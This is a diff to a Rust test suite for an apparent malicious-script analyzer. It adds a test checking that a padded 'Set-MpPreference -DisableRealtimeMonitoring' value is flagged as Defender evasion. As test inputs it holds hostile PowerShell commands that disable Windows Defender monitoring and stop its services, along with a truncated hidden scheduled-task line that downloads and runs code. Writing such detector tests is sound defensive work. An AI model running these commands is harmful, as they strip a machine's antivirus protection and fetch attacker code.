@@ -2907,6 +2907,24 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn set_mppreference_padded_disable_value_emits_defender_evasion_trait() {
+        let script =
+            br#"powershell -Command "Set-MpPreference -DisableRealtimeMonitoring 0x00000001""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "setmp-disablerealtimemonitoring"
+                        && target == "0x00000001"
+            )),
+            "padded Set-MpPreference disable value was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_stop_service_name_list_emits_each_defender_evasion_trait() {
         let script = br#"powershell -Command "Stop-Service -Name WinDefend, WdNisSvc -Force""#;
         let report = analyze(script, &AnalyzeConfig::default());
